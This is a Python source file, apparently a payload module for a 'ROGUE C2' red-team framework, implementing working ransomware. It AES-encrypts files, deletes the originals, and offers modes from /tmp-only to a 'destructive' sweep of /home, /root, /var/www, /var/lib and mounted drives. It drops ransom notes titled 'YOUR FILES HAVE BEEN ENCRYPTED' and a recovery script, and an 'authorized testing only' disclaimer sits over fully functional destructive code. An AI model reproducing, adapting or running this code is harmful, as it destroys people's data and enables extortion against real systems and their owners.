#!/usr/bin/env python3
"""
PAYLOAD: File Encryption/Decryption
DESCRIPTION: Encrypt/decrypt files with password protection with SYSTEM-WIDE encryption option
INTEGRATION: ROGUE C2 Framework - Use via trigger_fileransom
AUTHOR: Rogue Red Team
VERSION: 2.0 - Added SYSTEM_WIDE encryption
SECURITY: For authorized testing only - NEVER use for illegal activities
"""
import os, sys, hashlib, json, base64, random, string, time, argparse, shutil
from Cryptodome.Cipher import AES
from Cryptodome.Random import get_random_bytes
from Cryptodome.Protocol.KDF import PBKDF2

class FileEncryptor:
    def __init__(self, password=None):
        self.password = password or self.generate_password()
        self.salt = get_random_bytes(16)
        self.key = self.derive_key(self.password, self.salt)
        self.encrypted_files = []
        self.decrypted_files = []
        self.target_directories = []
        
    def generate_password(self, length=32):
        """Generate strong password"""
        chars = string.ascii_letters + string.digits + string.punctuation
        return ''.join(random.choice(chars) for _ in range(length))
    
    def derive_key(self, password, salt):
        """Derive encryption key from password"""
        return PBKDF2(password, salt, dkLen=32, count=1000000)
    
    def encrypt_file(self, filepath):
        """Encrypt a single file"""
        try:
            # Skip if already encrypted
            if filepath.endswith('.encrypted'):
                return False
            
            # Skip system critical files
            system_critical = [
                '/etc/passwd', '/etc/shadow', '/etc/group',
                '/etc/fstab', '/etc/hosts', '/boot',
                '/proc', '/sys', '/dev', '/run'
            ]
            
            for critical in system_critical:
                if filepath.startswith(critical):
                    print(f"[!] Skipping critical system file: {filepath}")
                    return False
            
            # Read file
            with open(filepath, 'rb') as f:
                plaintext = f.read()
            
            # Generate IV and encrypt
            iv = get_random_bytes(16)
            cipher = AES.new(self.key, AES.MODE_CBC, iv)
            
            # Pad plaintext
            pad_length = 16 - (len(plaintext) % 16)
            plaintext += bytes([pad_length]) * pad_length
            
            ciphertext = cipher.encrypt(plaintext)
            
            # Save encrypted file
            encrypted_path = filepath + '.encrypted'
            with open(encrypted_path, 'wb') as f:
                f.write(iv + self.salt + ciphertext)
            
            # Remove original
            os.remove(filepath)
            
            self.encrypted_files.append({
                'original': filepath,
                'encrypted': encrypted_path,
                'timestamp': time.time(),
                'size': len(ciphertext)
            })
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to encrypt {filepath}: {e}")
            return False
    
    def decrypt_file(self, encrypted_path, output_path=None):
        """Decrypt a file"""
        try:
            if not output_path:
                output_path = encrypted_path.replace('.encrypted', '')
            
            # Read encrypted file
            with open(encrypted_path, 'rb') as f:
                data = f.read()
            
            iv = data[:16]
            salt = data[16:32]
            ciphertext = data[32:]
            
            # Re-derive key
            key = self.derive_key(self.password, salt)
            
            # Decrypt
            cipher = AES.new(key, AES.MODE_CBC, iv)
            plaintext = cipher.decrypt(ciphertext)
            
            # Remove padding
            pad_length = plaintext[-1]
            plaintext = plaintext[:-pad_length]
            
            # Write decrypted file
            with open(output_path, 'wb') as f:
                f.write(plaintext)
            
            # Remove encrypted file
            os.remove(encrypted_path)
            
            self.decrypted_files.append({
                'encrypted': encrypted_path,
                'decrypted': output_path,
                'timestamp': time.time()
            })
            
            return True
            
        except Exception as e:
            print(f"[!] Failed to decrypt {encrypted_path}: {e}")
            return False
    
    def encrypt_directory(self, directory, extensions=None, recursive=True):
        """Encrypt all files in directory"""
        if not extensions:
            extensions = ['.txt', '.doc', '.docx', '.pdf', '.xls', '.xlsx', '.ppt', '.pptx',
                         '.jpg', '.jpeg', '.png', '.gif', '.bmp', '.tiff', '.psd', '.ai',
                         '.zip', '.tar', '.gz', '.7z', '.rar', '.bz2', '.xz',
                         '.sql', '.db', '.sqlite', '.mdb', '.csv', '.xml', '.json', '.yml', '.yaml',
                         '.py', '.js', '.html', '.htm', '.css', '.php', '.java', '.cpp', '.c', '.go', '.rs',
                         '.mp3', '.mp4', '.avi', '.mkv', '.mov', '.wmv', '.flv', '.wav',
                         '.odt', '.ods', '.odp', '.rtf', '.tex', '.md', '.log',
                         '.key', '.pem', '.crt', '.cer', '.p12', '.pfx', '.der']
        
        encrypted_count = 0
        total_count = 0
        
        if not os.path.exists(directory):
            return encrypted_count, total_count
        
        if recursive:
            walk_generator = os.walk(directory)
        else:
            # Non-recursive: only top-level files
            walk_generator = [(directory, [], [f for f in os.listdir(directory) if os.path.isfile(os.path.join(directory, f))])]
        
        for root, dirs, files in walk_generator:
            for file in files:
                # Skip already encrypted files
                if file.endswith('.encrypted'):
                    continue
                    
                # Check extension
                if any(file.lower().endswith(ext.lower()) for ext in extensions):
                    filepath = os.path.join(root, file)
                    total_count += 1
                    
                    try:
                        if self.encrypt_file(filepath):
                            encrypted_count += 1
                    except Exception as e:
                        print(f"[!] Error with {filepath}: {e}")
        
        return encrypted_count, total_count
    
    def encrypt_system_wide(self, mode="user"):
        """Encrypt files system-wide based on mode"""
        print(f"[+] Starting SYSTEM WIDE encryption mode: {mode}")
        
        if mode == "test":
            # Test mode - only encrypt /tmp
            self.target_directories = ["/tmp"]
        
        elif mode == "user":
            # User files only (safer)
            home = os.path.expanduser("~")
            self.target_directories = [
                os.path.join(home, "Documents"),
                os.path.join(home, "Downloads"),
                os.path.join(home, "Desktop"),
                os.path.join(home, "Pictures"),
                os.path.join(home, "Music"),
                os.path.join(home, "Videos"),
                os.path.join(home, "Public"),
                os.path.join(home, "Templates"),
            ]
        
        elif mode == "aggressive":
            # Aggressive - all user data + some system logs
            home = os.path.expanduser("~")
            self.target_directories = [
                os.path.join(home, "Documents"),
                os.path.join(home, "Downloads"),
                os.path.join(home, "Desktop"),
                os.path.join(home, "Pictures"),
                os.path.join(home, "Music"),
                os.path.join(home, "Videos"),
                os.path.join(home, "Public"),
                os.path.join(home, "Templates"),
                "/var/log",  # System logs
                "/tmp",
                "/var/tmp"
            ]
        
        elif mode == "destructive":
            # DESTRUCTIVE - Encrypt everything except critical system files
            # WARNING: This can break the system
            print("[!] WARNING: DESTRUCTIVE MODE - This can break the system!")
            print("[!] Only use in isolated test environments!")
            
            # Get all mounted filesystems excluding system ones
            mounted_dirs = []
            try:
                with open('/proc/mounts', 'r') as f:
                    for line in f:
                        parts = line.split()
                        if len(parts) > 1:
                            mount_point = parts[1]
                            # Skip system mounts
                            if mount_point not in ['/', '/boot', '/proc', '/sys', '/dev', '/run']:
                                mounted_dirs.append(mount_point)
            except:
                pass
            
            self.target_directories = [
                "/home",
                "/root",
                "/var/www",  # Web directories
                "/opt",
                "/usr/local",
                "/srv",
                "/var/lib",  # Application data
                "/var/log",
                "/tmp",
                "/var/tmp"
            ] + mounted_dirs
        
        else:
            print(f"[!] Unknown mode: {mode}")
            return 0, 0
        
        # Filter out non-existent directories
        existing_dirs = [d for d in self.target_directories if os.path.exists(d)]
        print(f"[+] Found {len(existing_dirs)}/{len(self.target_directories)} target directories")
        
        total_encrypted = 0
        total_files = 0
        
        for directory in existing_dirs:
            print(f"[+] Encrypting directory: {directory}")
            encrypted, total = self.encrypt_directory(directory)
            total_encrypted += encrypted
            total_files += total
            print(f"    -> Encrypted {encrypted}/{total} files")
        
        return total_encrypted, total_files
    
    def create_ransom_note(self, directory=None):
        """Create README_FOR_DECRYPT.txt with instructions"""
        if not directory:
            directory = os.path.expanduser("~")
        
        note_content = f"""=============================================
 YOUR FILES HAVE BEEN ENCRYPTED
=============================================

Your important files have been encrypted with military-grade AES-256 encryption.

To decrypt your files, you need the decryption password.

Password: {self.password}

=============================================
 INSTRUCTIONS FOR DECRYPTION
=============================================

1. Save this password securely
2. Run the decryption tool with this password
3. All files with .encrypted extension will be restored

=============================================
 WARNING
=============================================
- Do NOT modify or delete .encrypted files
- Do NOT attempt to decrypt without the password
- Keep this file for reference

Generated: {time.ctime()}
Encryption ID: {hashlib.md5(self.password.encode()).hexdigest()[:8]}
Total Files Encrypted: {len(self.encrypted_files)}
============================================="""
        
        note_path = os.path.join(directory, "README_FOR_DECRYPT.txt")
        with open(note_path, 'w') as f:
            f.write(note_content)
        
        # Also create recovery script
        recovery_script = f"""#!/bin/bash
# Recovery script for encrypted files
echo "Starting file recovery..."
echo "Using password: {self.password}"
python3 -c "
import os, sys, hashlib, base64
from Cryptodome.Cipher import AES
from Cryptodome.Protocol.KDF import PBKDF2

def derive_key(password, salt):
    return PBKDF2(password, salt, dkLen=32, count=1000000)

password = '{self.password}'
decrypted_count = 0

for root, dirs, files in os.walk('/'):
    for file in files:
        if file.endswith('.encrypted'):
            filepath = os.path.join(root, file)
            try:
                with open(filepath, 'rb') as f:
                    data = f.read()
                iv = data[:16]
                salt = data[16:32]
                ciphertext = data[32:]
                key = derive_key(password, salt)
                cipher = AES.new(key, AES.MODE_CBC, iv)
                plaintext = cipher.decrypt(ciphertext)
                pad_length = plaintext[-1]
                plaintext = plaintext[:-pad_length]
                output_path = filepath.replace('.encrypted', '')
                with open(output_path, 'wb') as f:
                    f.write(plaintext)
                os.remove(filepath)
                decrypted_count += 1
                if decrypted_count % 100 == 0:
                    print(f'[+] Restored {{decrypted_count}} files...')
            except Exception as e:
                print(f'[!] Failed: {{filepath}} - {{e}}')

print(f'[+] Recovery complete! Restored {{decrypted_count}} files.')
"
echo "Recovery complete!"
"""
        
        script_path = os.path.join(directory, "recover_files.sh")
        with open(script_path, 'w') as f:
            f.write(recovery_script)
        os.chmod(script_path, 0o755)
        
        # Create desktop note for visibility
        desktop = os.path.join(os.path.expanduser("~"), "Desktop")
        if os.path.exists(desktop):
            desktop_note = os.path.join(desktop, "YOUR_FILES_ARE_ENCRYPTED.txt")
            shutil.copy(note_path, desktop_note)
        
        return note_path
    
    def execute_encryption(self, target_path=None, mode=None):
        """Main encryption execution"""
        try:
            if mode and mode.startswith("system_"):
                # System-wide encryption mode
                mode_type = mode.replace("system_", "")
                if mode_type not in ["test", "user", "aggressive", "destructive"]:
                    mode_type = "user"
                
                print(f"[+] Starting SYSTEM WIDE encryption: {mode_type} mode")
                print(f"[+] Encryption password: {self.password}")
                
                encrypted, total = self.encrypt_system_wide(mode_type)
                result = f"SYSTEM WIDE: Encrypted {encrypted}/{total} files across {len(self.target_directories)} directories"
                
                # Create ransom note in home directory
                note_path = self.create_ransom_note()
                print(f"[+] System-wide ransom note created: {note_path}")
                
            elif target_path and target_path.lower() == "all":
                # Legacy "all" mode - encrypt common user directories
                home = os.path.expanduser("~")
                common_dirs = [
                    os.path.join(home, "Documents"),
                    os.path.join(home, "Downloads"),
                    os.path.join(home, "Desktop"),
                    os.path.join(home, "Pictures")
                ]
                
                total_encrypted = 0
                total_files = 0
                
                for directory in common_dirs:
                    if os.path.exists(directory):
                        print(f"[+] Encrypting: {directory}")
                        encrypted, total = self.encrypt_directory(directory)
                        total_encrypted += encrypted
                        total_files += total
                
                result = f"ALL USER FILES: Encrypted {total_encrypted}/{total_files} files"
                note_path = self.create_ransom_note(home)
                print(f"[+] Ransom note created: {note_path}")
                
            elif target_path:
                # Normal single directory/file encryption
                print(f"[+] Starting encryption of: {target_path}")
                print(f"[+] Encryption password: {self.password}")
                
                if os.path.isfile(target_path):
                    success = self.encrypt_file(target_path)
                    if success:
                        result = f"Encrypted 1/1 files"
                    else:
                        result = "Encryption failed"
                else:
                    encrypted, total = self.encrypt_directory(target_path)
                    result = f"Encrypted {encrypted}/{total} files"
                
                # Create ransom note if directory
                if os.path.isdir(target_path):
                    note_path = self.create_ransom_note(target_path)
                    print(f"[+] Ransom note created: {note_path}")
            else:
                # Default to user's Documents
                target_path = os.path.expanduser("~/Documents")
                print(f"[+] Starting encryption of: {target_path}")
                print(f"[+] Encryption password: {self.password}")
                
                encrypted, total = self.encrypt_directory(target_path)
                result = f"Encrypted {encrypted}/{total} files"
                
                note_path = self.create_ransom_note(target_path)
                print(f"[+] Ransom note created: {note_path}")
            
            # Save encryption log
            log_data = {
                'password': self.password,
                'salt': base64.b64encode(self.salt).decode(),
                'encrypted_files': self.encrypted_files,
                'target_directories': self.target_directories,
                'total_encrypted': len(self.encrypted_files),
                'timestamp': time.time(),
                'result': result,
                'mode': mode if mode else 'standard'
            }
            
            log_dir = os.path.expanduser("~/.cache/.rogue")
            os.makedirs(log_dir, exist_ok=True)
            log_path = os.path.join(log_dir, "encryption_log.json")
            
            with open(log_path, 'w') as f:
                json.dump(log_data, f, indent=2)
            
            return f"""[+] Encryption complete
{result}
[+] Password: {self.password}
[+] Mode: {mode if mode else 'standard'}
[+] Note: Password saved to {log_path}"""
            
        except Exception as e:
            return f"[!] Encryption failed: {e}"
    
    def execute_decryption(self, target_path=None, password=None, mode=None):
        """Main decryption execution"""
        try:
            if not password:
                # Try to load password from log
                log_path = os.path.expanduser("~/.cache/.rogue/encryption_log.json")
                if os.path.exists(log_path):
                    with open(log_path, 'r') as f:
                        log_data = json.load(f)
                    password = log_data.get('password')
                
                if not password:
                    return "[!] No password provided and no log found"
            
            # Set the password
            self.password = password
            self.salt = get_random_bytes(16)  # Will be overridden by file salt
            self.key = self.derive_key(self.password, self.salt)
            
            print(f"[+] Starting decryption")
            print(f"[+] Using password: {password[:10]}...")
            
            decrypted_count = 0
            total_count = 0
            
            if mode == "system_wide":
                # System-wide decryption - scan entire filesystem
                print("[+] Scanning entire filesystem for encrypted files...")
                for root, dirs, files in os.walk("/"):
                    # Skip system directories
                    if any(root.startswith(exclude) for exclude in ['/proc', '/sys', '/dev', '/run']):
                        continue
                        
                    for file in files:
                        if file.endswith('.encrypted'):
                            filepath = os.path.join(root, file)
                            total_count += 1
                            
                            try:
                                if self.decrypt_file(filepath):
                                    decrypted_count += 1
                                    if decrypted_count % 100 == 0:
                                        print(f"[+] Decrypted {decrypted_count} files...")
                            except Exception as e:
                                print(f"[!] Failed to decrypt {filepath}: {e}")
            else:
                # Standard decryption
                if not target_path:
                    # Look for encrypted files in common locations
                    possible_paths = [
                        os.path.expanduser("~/Documents"),
                        os.path.expanduser("~/Downloads"),
                        os.path.expanduser("~/Desktop"),
                        os.path.expanduser("~/Pictures"),
                        "/tmp",
                        "/var/tmp"
                    ]
                    
                    for path in possible_paths:
                        if os.path.exists(path):
                            target_path = path
                            break
                    
                    if not target_path:
                        target_path = "."
                
                print(f"[+] Scanning: {target_path}")
                for root, dirs, files in os.walk(target_path):
                    for file in files:
                        if file.endswith('.encrypted'):
                            filepath = os.path.join(root, file)
                            total_count += 1
                            
                            try:
                                if self.decrypt_file(filepath):
                                    decrypted_count += 1
                            except Exception as e:
                                print(f"[!] Failed to decrypt {filepath}: {e}")
            
            # Remove ransom notes
            for root, dirs, files in os.walk("/"):
                for file in files:
                    if file == "README_FOR_DECRYPT.txt" or file == "YOUR_FILES_ARE_ENCRYPTED.txt":
                        try:
                            os.remove(os.path.join(root, file))
                        except:
                            pass
            
            # Remove recovery script
            for root, dirs, files in os.walk("/"):
                for file in files:
                    if file == "recover_files.sh":
                        try:
                            os.remove(os.path.join(root, file))
                        except:
                            pass
            
            return f"[+] Decryption complete: {decrypted_count}/{total_count} files restored"
            
        except Exception as e:
            return f"[!] Decryption failed: {e}"

# === ROGUE C2 INTEGRATION ===
def rogue_integration(args=None):
    """Main entry point for ROGUE C2 integration"""
    if args is None:
        # Parse command line arguments
        parser = argparse.ArgumentParser(description='File Encryption/Decryption for ROGUE C2')
        parser.add_argument('action', choices=['encrypt', 'decrypt'], help='Action to perform')
        parser.add_argument('target', nargs='?', default=None, help='Target file/directory or "all" or "system_<mode>"')
        parser.add_argument('--password', '-p', default=None, help='Password for decryption')
        parser.add_argument('--custom-password', '-c', default=None, help='Custom password for encryption')
        parser.add_argument('--mode', '-m', default=None, help='Encryption mode (system_test, system_user, system_aggressive, system_destructive)')
        
        args = parser.parse_args()
    
    if args.action == 'encrypt':
        if args.custom_password:
            encryptor = FileEncryptor(args.custom_password)
        else:
            encryptor = FileEncryptor()
        
        # Check if we're using system-wide encryption
        if args.target and args.target.startswith("system_"):
            result = encryptor.execute_encryption(mode=args.target)
        elif args.mode and args.mode.startswith("system_"):
            result = encryptor.execute_encryption(target_path=args.target, mode=args.mode)
        else:
            result = encryptor.execute_encryption(args.target)
        
        return result
    
    elif args.action == 'decrypt':
        if not args.password:
            return "[!] Password required for decryption. Use --password option"
        
        encryptor = FileEncryptor(args.password)
        
        # Check if we need system-wide decryption
        if args.target and args.target == "system_wide":
            result = encryptor.execute_decryption(mode="system_wide", password=args.password)
        else:
            result = encryptor.execute_decryption(args.target, args.password)
        
        return result

# === For standalone testing ===
def main():
    """Standalone execution for testing"""
    print("=" * 60)
    print("ROGUE File Encryption Payload v2.0 - SYSTEM WIDE MODES")
    print("=" * 60)
    print("[!] WARNING: This is a destructive payload!")
    print("[!] Only use in isolated test environments!")
    print("=" * 60)
    
    if len(sys.argv) > 1:
        # Parse arguments from command line
        result = rogue_integration()
        print(result)
    else:
        # Interactive mode
        print("\nSelect mode:")
        print("1. Encrypt single file/directory")
        print("2. Encrypt ALL user files (Documents, Downloads, Desktop, Pictures)")
        print("3. Encrypt SYSTEM WIDE - Test mode (/tmp only)")
        print("4. Encrypt SYSTEM WIDE - User mode (user directories only)")
        print("5. Encrypt SYSTEM WIDE - Aggressive mode (user + logs)")
        print("6. Encrypt SYSTEM WIDE - DESTRUCTIVE mode (WARNING: can break system)")
        print("7. Decrypt files")
        print("8. Decrypt SYSTEM WIDE (scan entire filesystem)")
        print("9. Exit")
        
        choice = input("\nEnter choice (1-9): ").strip()
        
        if choice == '1':
            target = input("Enter target file/directory [/tmp/test]: ").strip()
            if not target:
                target = "/tmp/test"
                os.makedirs(target, exist_ok=True)
                for i in range(3):
                    with open(os.path.join(target, f"test{i}.txt"), 'w') as f:
                        f.write(f"Test file {i}\n")
            
            encryptor = FileEncryptor()
            result = encryptor.execute_encryption(target)
            print(f"\n{result}")
            
        elif choice == '2':
            print("\n[+] Encrypting ALL user files...")
            encryptor = FileEncryptor()
            result = encryptor.execute_encryption("all")
            print(f"\n{result}")
            
        elif choice == '3':
            print("\n[+] Encrypting SYSTEM WIDE - Test mode (/tmp only)")
            encryptor = FileEncryptor()
            result = encryptor.execute_encryption(mode="system_test")
            print(f"\n{result}")
            
        elif choice == '4':
            print("\n[+] Encrypting SYSTEM WIDE - User mode")
            print("[+] This will encrypt user directories only")
            if input("Continue? (y/n): ").lower() == 'y':
                encryptor = FileEncryptor()
                result = encryptor.execute_encryption(mode="system_user")
                print(f"\n{result}")
            else:
                print("[*] Cancelled")
                
        elif choice == '5':
            print("\n[+] Encrypting SYSTEM WIDE - Aggressive mode")
            print("[+] This will encrypt user directories + system logs")
            print("[!] WARNING: This may affect system operation")
            if input("Continue? (y/n): ").lower() == 'y':
                encryptor = FileEncryptor()
                result = encryptor.execute_encryption(mode="system_aggressive")
                print(f"\n{result}")
            else:
                print("[*] Cancelled")
                
        elif choice == '6':
            print("\n" + "=" * 60)
            print("[!] DESTRUCTIVE SYSTEM WIDE ENCRYPTION")
            print("[!] WARNING: This can BREAK THE SYSTEM!")
            print("[!] Only use in isolated test environments!")
            print("=" * 60)
            
            confirm = input("\nType 'DESTROY' to confirm: ").strip()
            if confirm == 'DESTROY':
                encryptor = FileEncryptor()
                result = encryptor.execute_encryption(mode="system_destructive")
                print(f"\n{result}")
            else:
                print("[*] Cancelled - safety first!")
                
        elif choice == '7':
            password = input("Enter decryption password: ").strip()
            if not password:
                print("[!] Password required!")
                return
            
            target = input("Enter target path [default: current directory]: ").strip()
            if not target:
                target = "."
            
            encryptor = FileEncryptor(password)
            result = encryptor.execute_decryption(target, password)
            print(f"\n{result}")
            
        elif choice == '8':
            password = input("Enter decryption password: ").strip()
            if not password:
                print("[!] Password required!")
                return
            
            print("\n[!] SYSTEM WIDE DECRYPTION")
            print("[!] This will scan the entire filesystem for encrypted files")
            if input("Continue? (y/n): ").lower() == 'y':
                encryptor = FileEncryptor(password)
                result = encryptor.execute_decryption(mode="system_wide", password=password)
                print(f"\n{result}")
            else:
                print("[*] Cancelled")
        
        else:
            print("[*] Exiting...")

if __name__ == "__main__":
    # When run directly, use main()
    main()
else:
    # When imported by ROGUE C2, provide integration function
    pass
